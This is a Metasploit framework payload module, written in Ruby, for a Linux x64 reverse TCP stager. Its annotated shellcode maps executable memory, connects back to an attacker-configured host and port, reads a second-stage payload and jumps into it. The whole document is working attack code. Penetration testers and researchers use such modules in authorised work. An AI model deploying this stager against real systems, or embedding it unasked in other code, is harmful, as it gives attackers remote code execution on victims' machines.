##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 96

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['ricky', 'tkmru'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ 55, 'ADDR' ],
              'LPORT' => [ 53, 'n'    ],
            },
          'Payload' =>
            # Generated from external/source/shellcode/linux/x64/stager_sock_reverse.s
            "\x48\x31\xff"                 + # xor    %rdi,%rdi
            "\x6a\x09"                     + # pushq  $0x9
            "\x58"                         + # pop    %rax
            "\x99"                         + # cltd
            "\xb6\x10"                     + # mov    $0x10,%dh
            "\x48\x89\xd6"                 + # mov    %rdx,%rsi
            "\x4d\x31\xc9"                 + # xor    %r9,%r9
            "\x6a\x22"                     + # pushq  $0x22
            "\x41\x5a"                     + # pop    %r10
            "\xb2\x07"                     + # mov    $0x7,%dl
            "\x0f\x05"                     + # syscall
            # mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
            "\x48\x85\xc0"                 + # test   %rax,%rax
            "\x78\x3c"                     + # js     40012c <failed>
            "\x56"                         + # push   %rsi
            "\x50"                         + # push   %rax
            "\x6a\x29"                     + # pushq  $0x29
            "\x58"                         + # pop    %rax
            "\x99"                         + # cltd
            "\x6a\x02"                     + # pushq  $0x2
            "\x5f"                         + # pop    %rdi
            "\x6a\x01"                     + # pushq  $0x1
            "\x5e"                         + # pop    %rsi
            "\x0f\x05"                     + # syscall
            # socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
            "\x48\x85\xc0"                 + # test   %rax,%rax
            "\x78\x29"                     + # js     40012c <failed>
            "\x48\x97"                     + # xchg   %rax,%rdi
            "\x48\xb9\x02\x00"             + # movabs $0x100007fb3150002,%rcx
            "\x15\xb3"                     + # LPORT
            "\x7f\x00\x00\x01"             + # LHOST
            "\x51"                         + # push   %rcx
            "\x48\x89\xe6"                 + # mov    %rsp,%rsi
            "\x6a\x10"                     + # pushq  $0x10
            "\x5a"                         + # pop    %rdx
            "\x6a\x2a"                     + # pushq  $0x2a
            "\x58"                         + # pop    %rax
            "\x0f\x05"                     + # syscall
            # connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
            "\x48\x85\xc0"                 + # test   %rax,%rax
            "\x78\x0c"                     + # js     40012c <failed>
            "\x59"                         + # pop    %rcx
            "\x5e"                         + # pop    %rsi
            "\x5a"                         + # pop    %rdx
            "\x0f\x05"                     + # syscall
            # read(3, "", 4096)
            "\x48\x85\xc0"                 + # test   %rax,%rax
            "\x78\x02"                     + # js     40012c <failed>
            "\xff\xe6"                     + # jmpq   *%rsi
            # 40012c <failed>:
            "\x6a\x3c"                     + # pushq  $0x3c
            "\x58"                         + # pop    %rax
            "\x6a\x01"                     + # pushq  $0x1
            "\x5f"                         + # pop    %rdi
            "\x0f\x05"                       #syscall
            # exit(1)
        }
      ))
  end
end
